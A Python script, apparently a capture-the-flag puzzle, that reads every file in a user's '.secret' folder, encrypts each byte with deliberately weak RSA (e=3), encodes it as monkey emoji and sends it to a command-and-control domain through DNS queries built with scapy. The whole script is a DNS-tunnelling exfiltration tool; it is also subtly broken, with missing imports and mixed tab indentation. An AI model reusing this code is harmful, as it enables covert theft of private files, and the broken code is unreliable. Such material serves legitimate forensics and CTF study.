#!/usr/bin/env python3
# coding: utf8

from Crypto.PublicKey import RSA
from binascii import hexlify
import base64
from random import randint
from os import listdir
from os.path import isfile, join
import json

C2 = "monkey.bzh"
KEY = RSA.generate(4096, e=3)


def start_exfiltration(f_name: str):
    m = base64.b64encode((f"Starting exfiltration of the file {f_name}").encode())
    sr1(IP(dst=C2)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m),qtype="A")),timeout=randint(1, 10))


def end_exfiltration(f_name: str):
    m = base64.b64encode(f"The file {f_name} has been extracted".encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def exfiltrate_data(message):
	print(message)
    m = base64.b64encode(message.encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def format_query(message: bytes) -> bytes:
    message = message.decode()
    n = 32
    data = [message[i:i+n] for i in range(0, len(message), n)]
    url = '.'.join(data) + '.' + C2
    return url.encode()


def lambdhack_like_rsa(f_name: str):
    with open(f_name, "rb") as f:
        data = f.read(1)
        while data:
            print("char: ")
            print(data)
            flag = int(hexlify(data),16)
            print("hex: " + str(flag))
            encoded = pow(flag, KEY.e, KEY.n)
            print("encoded: " + str(encoded))
            exfiltrate_data(i_m_a_monkey(encoded))
            data = f.read(1)


def i_m_a_monkey(i_wanna_be_a_monkey):
    my_super_monkey = ""
    for monkey in str(i_wanna_be_a_monkey):
        print ("monkey: " + monkey)
        monkey = int(monkey)
        my_super_monkey += int(monkey/5)*"🙈" + int(monkey%5)*"🙉" + "🙊🙊"
    return my_super_monkey


if __name__=='__main__':
    with open('data.txt') as json_file:
        data = json.load(json_file)
        for p in data['people']:
           print('Name: ' + p['name'])
           print('Website: ' + p['website'])
           print('From: ' + p['from'])
           print('')

	PATH = "/home/Brian/.secret/"
    FILES = [f for f in listdir(PATH) if isfile(join(PATH, f))]

    for f in FILES:
        start_exfiltration(PATH + f)
        lambdhack_like_rsa(PATH + f)
        end_exfiltration(PATH + f)